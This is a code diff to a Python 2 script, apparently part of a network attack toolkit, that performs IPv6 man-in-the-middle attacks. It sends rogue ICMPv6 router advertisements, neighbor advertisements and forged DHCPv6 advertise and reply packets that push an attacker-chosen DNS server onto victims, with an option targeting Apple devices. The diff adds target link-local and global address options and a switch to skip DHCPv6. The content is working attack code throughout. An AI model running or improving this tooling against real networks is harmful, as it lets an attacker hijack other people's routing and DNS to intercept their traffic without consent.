@@ -18,6 +18,7 @@ recursive_dns_address = None
 
 need_neighbor_advertise = False
 need_router_advertise = True
+disable_dhcpv6 = False
 dhcpv6_request_in_your_server = False
 icmpv6_neighbor_solicit_your_ip = False
 already_print_success_message = False
@@ -35,11 +36,17 @@ parser.add_argument('-p', '--prefix', type=str, help='Set network prefix', defau
 parser.add_argument('-f', '--first_suffix_ip', type=str, help='Set first suffix client ip for offering', default='2')
 parser.add_argument('-l', '--last_suffix_ip', type=str, help='Set last suffix client ip for offering', default='255')
 parser.add_argument('-t', '--target_mac', type=str, help='Set target MAC address', default=None)
-parser.add_argument('-I', '--target_ip', type=str, help='Set client IPv6 address with MAC in --target_mac', default=None)
+
+parser.add_argument('-L', '--local_ipv6', type=str, help='Set client Link local IPv6 address with MAC in --target_mac',
+                    default=None)
+parser.add_argument('-G', '--global_ipv6', type=str, help='Set client Global IPv6 address with MAC in --target_mac',
+                    default=None)
+
+parser.add_argument('-D', '--disable_dhcpv6', action='store_true', help='Do not use DHCPv6 protocol')
 parser.add_argument('-d', '--dns', type=str, help='Set recursive DNS IPv6 address', default=None)
 parser.add_argument('-s', '--dns_search', type=str, help='Set DNS search list', default="test.com")
 parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')
-parser.add_argument('--apple', action='store_true', help='Apple devices MiTM')
+parser.add_argument('-a', '--apple', action='store_true', help='Apple devices MiTM')
 args = parser.parse_args()
 
 if not args.quiet:
@@ -49,6 +56,9 @@ eth = Ethernet_raw()
 ipv6 = IPv6_raw()
 dhcpv6 = DHCPv6_raw()
 icmpv6 = ICMPv6_raw()
+
+if args.disable_dhcpv6:
+    disable_dhcpv6 = True
 
 if args.interface is None:
     current_network_interface = Base.netiface_selection()
@@ -64,9 +74,9 @@ dns_search = args.dns_search
 if args.target_mac is not None:
     target_mac_address = str(args.target_mac).lower()
 
-if args.target_ip is not None:
-    target_ip_address = args.target_ip
-    ipv6_address = args.target_ip
+if args.global_ipv6 is not None:
+    target_ip_address = args.global_ipv6
+    ipv6_address = args.global_ipv6
 else:
     ipv6_address = "fd00::34e"
 
@@ -96,8 +106,10 @@ if not args.quiet:
     print Base.c_info + "Your IPv6 link local address: " + Base.cINFO + your_ipv6_link_address + Base.cEND
     if args.target_mac is not None:
         print Base.c_info + "Target MAC: " + Base.cINFO + args.target_mac + Base.cEND
-    if args.target_ip is not None:
-        print Base.c_info + "Target IP: " + Base.cINFO + args.target_ip + Base.cEND
+    if args.local_ipv6 is not None:
+        print Base.c_info + "Target Link local IPv6: " + Base.cINFO + args.local_ipv6 + Base.cEND
+    if args.global_ipv6 is not None:
+        print Base.c_info + "Target Global IPv6: " + Base.cINFO + args.global_ipv6 + Base.cEND
     else:
         print Base.c_info + "First suffix offer IP: " + Base.cINFO + args.first_suffix_ip + Base.cEND
         print Base.c_info + "Last suffix offer IP: " + Base.cINFO + args.last_suffix_ip + Base.cEND
@@ -142,16 +154,28 @@ def send_icmpv6_advertise_packets():
     SOCK.bind((current_network_interface, 0))
 
     if target_mac_address is not None:
+
+        if args.local_ipv6 is None:
+            target_ipv6_link_address = Base.create_ipv6_link_address(target_mac_address)
+        else:
+            target_ipv6_link_address = args.local_ipv6
+
         icmpv6_ra_packet = icmpv6.make_router_advertisement_packet(ethernet_src_mac=your_mac_address,
                                                                    ethernet_dst_mac=target_mac_address,
                                                                    ipv6_src=your_ipv6_link_address,
-                                                                   ipv6_dst="fe80::8e85:90ff:fe26:2be",
+                                                                   ipv6_dst=target_ipv6_link_address,
                                                                    dns_address=recursive_dns_address,
                                                                    domain_search=dns_search,
                                                                    prefix=network_prefix)
-        while need_router_advertise:
-            SOCK.send(icmpv6_ra_packet)
-            sleep(0.1)
+        if args.apple:
+            if args.local_ipv6 is not None:
+                while need_router_advertise:
+                    SOCK.send(icmpv6_ra_packet)
+                    sleep(0.1)
+        else:
+            while need_router_advertise:
+                SOCK.send(icmpv6_ra_packet)
+                sleep(0.1)
 
 
 def reply(request):
@@ -162,6 +186,7 @@ def reply(request):
     global icmpv6_neighbor_solicit_your_ip
     global dhcpv6_request_in_your_server
     global already_print_success_message
+    global disable_dhcpv6
     
     # ICMPv6 Router Solicitation
     if request.haslayer(ICMPv6ND_RS):
@@ -174,7 +199,6 @@ def reply(request):
                                                                    ipv6_dst=request[IPv6].src,
                                                                    dns_address=recursive_dns_address,
                                                                    domain_search=dns_search,
-                                                                   ipv6_addr=ipv6_address,
                                                                    prefix=network_prefix)
         try:
             global_socket.send(icmpv6_ra_packet)
@@ -186,6 +210,7 @@ def reply(request):
 
     # ICMPv6 Neighbor Solicitation
     if request.haslayer(ICMPv6ND_NS):
+        # pass
         if request[ICMPv6ND_NS].tgt != ipv6_address or need_neighbor_advertise:
             if request[ICMPv6ND_NS].tgt is not None:
                 icmpv6_na_packet = icmpv6.make_neighbor_advertisement_packet(ethernet_src_mac=your_mac_address,
@@ -197,70 +222,71 @@ def reply(request):
         else:
             icmpv6_neighbor_solicit_your_ip = True
 
-    # DHCPv6 Solicit
-    if request.haslayer(DHCP6_Solicit):
-        print Base.c_info + "Sniff DHCPv6 Solicit from: " + request[IPv6].src + " (" + \
-              request[Ether].src + ") TID: " + hex(request[DHCP6_Solicit].trid)
-        dhcpv6_advertise = dhcpv6.make_advertise_packet(ethernet_src_mac=your_mac_address,
-                                                        ethernet_dst_mac=request[Ether].src,
-                                                        ipv6_src=your_ipv6_link_address,
-                                                        ipv6_dst=request[IPv6].src,
-                                                        transaction_id=request[DHCP6_Solicit].trid,
-                                                        dns_address=recursive_dns_address,
-                                                        domain_search=dns_search,
-                                                        ipv6_address=ipv6_address,
-                                                        client_duid_timeval=request[DHCP6OptClientId].duid.timeval)
-        try:
-            global_socket.send(dhcpv6_advertise)
-            print Base.c_info + "Send DHCPv6 Advertise reply to: " + request[IPv6].src + " (" + \
-                  request[Ether].src + ")"
-        except:
-            print Base.c_error + "Do not send DHCPv6 Advertise reply to: " + request[IPv6].src + " (" + \
-                  request[Ether].src + ")"
+    if not disable_dhcpv6:
+        # DHCPv6 Solicit
+        if request.haslayer(DHCP6_Solicit):
+            print Base.c_info + "Sniff DHCPv6 Solicit from: " + request[IPv6].src + " (" + \
+                  request[Ether].src + ") TID: " + hex(request[DHCP6_Solicit].trid)
+            dhcpv6_advertise = dhcpv6.make_advertise_packet(ethernet_src_mac=your_mac_address,
+                                                            ethernet_dst_mac=request[Ether].src,
+                                                            ipv6_src=your_ipv6_link_address,
+                                                            ipv6_dst=request[IPv6].src,
+                                                            transaction_id=request[DHCP6_Solicit].trid,
+                                                            dns_address=recursive_dns_address,
+                                                            domain_search=dns_search,
+                                                            ipv6_address=ipv6_address,
+                                                            client_duid_timeval=request[DHCP6OptClientId].duid.timeval)
+            try:
+                global_socket.send(dhcpv6_advertise)
+                print Base.c_info + "Send DHCPv6 Advertise reply to: " + request[IPv6].src + " (" + \
+                      request[Ether].src + ")"
+            except:
+                print Base.c_error + "Do not send DHCPv6 Advertise reply to: " + request[IPv6].src + " (" + \
+                      request[Ether].src + ")"
 
-    # DHCPv6 Request
-    if request.haslayer(DHCP6_Request):
-        print Base.c_info + "Sniff DHCPv6 Request from: " + request[IPv6].src + " (" + \
-              request[Ether].src + ") TID: " + hex(request[DHCP6_Request].trid) + \
-              " Server MAC: " + request[DHCP6OptServerId].duid.lladdr + " IAADDR: " + request[DHCP6OptIAAddress].addr
-        # print request.summary
-        if request[DHCP6OptServerId].duid.lladdr != your_mac_address:
-            need_neighbor_advertise = True
-        else:
-            dhcpv6_request_in_your_server = True
+        # DHCPv6 Request
+        if request.haslayer(DHCP6_Request):
+            print Base.c_info + "Sniff DHCPv6 Request from: " + request[IPv6].src + " (" + \
+                  request[Ether].src + ") TID: " + hex(request[DHCP6_Request].trid) + \
+                  " Server MAC: " + request[DHCP6OptServerId].duid.lladdr + " IAADDR: " + request[DHCP6OptIAAddress].addr
+            # print request.summary
+            if request[DHCP6OptServerId].duid.lladdr != your_mac_address:
+                need_neighbor_advertise = True
+            else:
+                dhcpv6_request_in_your_server = True
 
-        dhcpv6_reply = dhcpv6.make_reply_packet(ethernet_src_mac=your_mac_address,
-                                                ethernet_dst_mac=request[Ether].src,
-                                                ipv6_src=your_ipv6_link_address,
-                                                ipv6_dst=request[IPv6].src,
-                                                transaction_id=request[DHCP6_Request].trid,
-                                                dns_address=recursive_dns_address,
-                                                domain_search=dns_search,
-                                                ipv6_address=ipv6_address,
-                                                client_duid_timeval=request[DHCP6OptClientId].duid.timeval)
-        try:
-            global_socket.send(dhcpv6_reply)
-            print Base.c_info + "Send DHCPv6 Reply to: " + request[IPv6].src + " (" + request[Ether].src + ")"
-        except:
-            print Base.c_error + "Do not send DHCPv6 Reply to: " + request[IPv6].src + " (" + \
-                  request[Ether].src + ")"
+            dhcpv6_reply = dhcpv6.make_reply_packet(ethernet_src_mac=your_mac_address,
+                                                    ethernet_dst_mac=request[Ether].src,
+                                                    ipv6_src=your_ipv6_link_address,
+                                                    ipv6_dst=request[IPv6].src,
+                                                    transaction_id=request[DHCP6_Request].trid,
+                                                    dns_address=recursive_dns_address,
+                                                    domain_search=dns_search,
+                                                    ipv6_address=ipv6_address,
+                                                    client_duid_timeval=request[DHCP6OptClientId].duid.timeval)
+            try:
+                global_socket.send(dhcpv6_reply)
+                print Base.c_info + "Send DHCPv6 Reply to: " + request[IPv6].src + " (" + request[Ether].src + ")"
+            except:
+                print Base.c_error + "Do not send DHCPv6 Reply to: " + request[IPv6].src + " (" + \
+                      request[Ether].src + ")"
 
-    # DHCPv6 Release
-    if request.haslayer(DHCP6_Release):
-        print Base.c_info + "Sniff DHCPv6 Release from: " + request[IPv6].src + " (" + \
-              request[Ether].src + ") TID: " + hex(request[DHCP6_Release].trid)
+        # DHCPv6 Release
+        if request.haslayer(DHCP6_Release):
+            print Base.c_info + "Sniff DHCPv6 Release from: " + request[IPv6].src + " (" + \
+                  request[Ether].src + ") TID: " + hex(request[DHCP6_Release].trid)
 
-    # DHCPv6 Confirm
-    if request.haslayer(DHCP6_Confirm):
-        print Base.c_info + "Sniff DHCPv6 Confirm from: " + request[IPv6].src + " (" + \
-              request[Ether].src + ") TID: " + hex(request[DHCP6_Confirm].trid)
+        # DHCPv6 Confirm
+        if request.haslayer(DHCP6_Confirm):
+            print Base.c_info + "Sniff DHCPv6 Confirm from: " + request[IPv6].src + " (" + \
+                  request[Ether].src + ") TID: " + hex(request[DHCP6_Confirm].trid)
 
-    # DHCPv6 Decline
-    if request.haslayer(DHCP6_Decline):
-        print Base.c_warning + "Sniff DHCPv6 Decline from: " + request[IPv6].src + " (" + \
-              request[Ether].src + ") TID: " + hex(request[DHCP6_Decline].trid) + \
-              " IAADDR: " + request[DHCP6OptIAAddress].addr
-        # print request.summary
+        # DHCPv6 Decline
+        if request.haslayer(DHCP6_Decline):
+            print Base.c_warning + "Sniff DHCPv6 Decline from: " + request[IPv6].src + " (" + \
+                  request[Ether].src + ") TID: " + hex(request[DHCP6_Decline].trid) + \
+                  " IAADDR: " + request[DHCP6OptIAAddress].addr
+            # print request.summary
 
     # Print MiTM Success message
     if icmpv6_neighbor_solicit_your_ip and dhcpv6_request_in_your_server and not already_print_success_message:
@@ -279,7 +305,7 @@ if __name__ == "__main__":
     tm.add_task(send_icmpv6_advertise_packets)
     tm.add_task(send_dhcpv6_solicit_packets)
 
-    if args.target_ip is not None:
+    if args.global_ipv6 is not None:
         if args.target_mac is None:
             print Base.c_error + "Please set target MAC address (--target_mac 00:AA:BB:CC:DD:FF) for target IPv6!"
             exit(1)
